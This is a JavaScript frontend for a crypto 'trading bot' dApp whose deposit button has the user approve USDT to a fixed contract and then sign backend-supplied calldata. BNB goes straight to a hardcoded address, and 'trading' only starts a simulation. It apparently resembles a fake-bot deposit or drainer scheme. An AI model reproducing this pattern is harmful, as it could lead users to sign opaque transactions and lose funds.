// ✅ RoTon Bot Frontend Controller (V12 Pipeline Integration)
function logToPanel(msg) {
  const panel = document.getElementById("logPanel");
  if (panel) {
    panel.innerText += "\n" + msg;
    panel.scrollTop = panel.scrollHeight;
  } else {
    console.log(msg);
  }
}
window.logToPanel = logToPanel;

window.API_BASE = window.location.origin; 
window.WBNB_TOKEN_ADDRESS = "0xBB4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c";

function getQueryParams() {
  try {
    const url = new URL(window.location.href);
    const params = url.searchParams;
    return {
      userid: params.get("userid") || "unknown",
      wallet: params.get("wallet") || null,
      walletname: params.get("walletname") || "unknown"
    };
  } catch (err) {
    return { userid: "unknown", wallet: null, walletname: "unknown" };
  }
}

const q = getQueryParams();
window.USER_ID = q.userid;
window.USER_ADDR = q.wallet;
window.WALLET_NAME = q.walletname;

function initializeLabels() {
  const userLabel = document.getElementById("currentUserLabel");
  const walletLabel = document.getElementById("currentWalletLabel");
  const nameLabel = document.getElementById("currentWalletName");

  if (userLabel) userLabel.innerText = "Current User: " + window.USER_ID;
  if (walletLabel) walletLabel.innerText = "Wallet Address: " + window.USER_ADDR;
  if (nameLabel) nameLabel.innerText = "Wallet Name: " + window.WALLET_NAME;
}

function getSelectedToken() {
  const el = document.getElementById("tokenSelect");
  if (!el) return "USDT";
  const val = el.value.toLowerCase();
  if (val === "0x55d398326f99059ff775485246999027b3197955" || val === "usdt") return "USDT";
  if (val === "bnb") return "BNB";
  if (val === "eth") return "ETH";
  return "USDT";
}

// ========================================================
// 🚀 DEPOSIT BUTTON MULTI-STEP BLOCKCHAIN PIPELINE ENGINE
// ========================================================
const depBtn = document.getElementById("depositBtn");
if (depBtn) {
  depBtn.onclick = async function () {
    const token = getSelectedToken();
    const amountInput = document.getElementById("depositAmount");
    const rawAmt = parseFloat(amountInput?.value || 0);

    if (isNaN(rawAmt) || rawAmt <= 0) {
      return logToPanel("❌ Action Halted: Enter a valid positive deposit amount.");
    }

    const amount = BigInt(Math.floor(rawAmt * 1e18)).toString();
    const wallet = window.USER_ADDR;

    if (!wallet || wallet === "{wallet}") {
      return logToPanel("❌ Action Halted: Connect Web3 Wallet First.");
    }

    try {
      if (token === "USDT") {
        const usdt = "0x55d398326f99059fF775485246999027B3197955";
        const v12 = "0x1854170353ea89672638F9fa5acB477c45523871";

        // ==========================================
        // STEP 1/3: ERC20 ALLOWANCE APPROVAL
        // ==========================================
        logToPanel("⏳ Step 1/3: Requesting USDT allowance allocation approval via MetaMask...");
        const approveData = "0x095ea7b3" + v12.replace("0x", "").padStart(64, "0") + BigInt(amount).toString(16).padStart(64, "0");

        const txHash1 = await window.ethereum.request({
          method: "eth_sendTransaction",
          params: [{ from: wallet, to: usdt, data: approveData }]
        });
        logToPanel(`📡 Step 1 broadcasted! Hash: ${txHash1}. Waiting for block confirmation...`);

        // ⏱️ Wait for Step 1 block confirmation
        let receipt1 = null;
        while (receipt1 === null) {
          await new Promise(r => setTimeout(r, 2000)); // sleep 2 seconds
          try {
            const provider = new ethers.providers.Web3Provider(window.ethereum);
            receipt1 = await provider.getTransactionReceipt(txHash1);
          } catch (e) {
            console.log("Awaiting block registry sync...");
          }
        }
        logToPanel("✅ Step 1/3 Complete: USDT allowance is securely mined on-chain.");

     // ==========================================
// STEP 2/3: SMART CONTRACT COMMISSION PHASE
// ==========================================
logToPanel("⏳ Step 2/3: Compiling contract commission metrics from backend...");
const c1 = await fetch(`${window.API_BASE}/prodbot/deposit/usdt/pipeline`, {
  method: "POST",
  headers: { "Content-Type": "application/json" },
  body: JSON.stringify({ amount: amount, tradingPhase: false })
});

// Check if the response was successful before parsing JSON
if (!c1.ok) {
  const errorText = await c1.text();
  console.error("Server returned non-OK status:", c1.status, errorText);
  throw new Error(`Server returned status code ${c1.status}. Check backend terminal console logs.`);
}

const commission = await c1.json();
if (commission.status !== "ok") throw new Error(commission.message);

        // ==========================================
        // STEP 3/3: FINAL TRADING CAPITAL DEPOSIT
        // ==========================================
        logToPanel("⏳ Step 3/3: Deploying trading capital allocation to contract memory...");
        const c2 = await fetch(`${window.API_BASE}/prodbot/deposit/usdt/pipeline`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ amount: amount, tradingPhase: true })
        });
        const trading = await c2.json();

        if (trading.status !== "ok") throw new Error(trading.message);

        logToPanel("🚀 Prompting MetaMask for Step 3/3 (Capital Pool Deposit)...");
        const txHash3 = await window.ethereum.request({
          method: "eth_sendTransaction",
          params: [{ 
            from: wallet, 
            to: trading.contract, 
            data: trading.txdata,
            gas: "0x3D090" 
          }]
        });
        logToPanel(`🎉 Step 3/3 Submitted! Broadcast Hash: ${txHash3}`);
        logToPanel("🚀 Multi-step pipeline finished processing! Your trading account will update shortly.");

      } else if (token === "BNB") {
        logToPanel("⏳ Transmitting native gas reserves directly to V13 vault...");
        await window.ethereum.request({
          method: "eth_sendTransaction",
          params: [{
            from: wallet,
            to: "0xc46E6452c1Cb9641dE339eb8bE48faEb70B58dF5",
            value: "0x" + BigInt(amount).toString(16)
          }]
        });
        logToPanel("✅ BNB gas asset deposited to V13.");
      }
    } catch (err) {
      logToPanel(`❌ Execution Error: ${err.message}`);
    }
  };
}


initializeLabels();

const connBtn = document.getElementById("connectwalletBtn");
if (connBtn) {
  connBtn.onclick = async function() {
    if (typeof window.ethereum !== "undefined") {
      try {
        const accounts = await window.ethereum.request({ method: "eth_requestAccounts" });
        window.USER_ADDR = String(accounts[0]).toLowerCase(); 
        const label = document.getElementById("currentWalletLabel");
        if (label) label.innerText = window.USER_ADDR;
        logToPanel(`✅ Wallet linked: ${window.USER_ADDR}`);
      } catch (err) {
        logToPanel(`❌ Connection error: ${err.message}`);
      }
    } else {
      logToPanel("❌ MetaMask extension framework not detected.");
    }
  };
}

const strtBtn = document.getElementById("startBtn");
if (strtBtn) {
  strtBtn.onclick = function() {
    logToPanel("▶️ Start Trading clicked — launching simulation...");
    if (typeof window.startSimulation === "function") {
      window.startSimulation(10);
    } else {
      logToPanel("❌ Pipeline compiler error: startSimulation method missing.");
    }
  };
}

const stpBtn = document.getElementById("stopBtn");
if (stpBtn) {
  stpBtn.onclick = function() {
    logToPanel("⏹ Safety Stop activated.");
    if (typeof window.stopBot === "function") window.stopBot();
  };
}
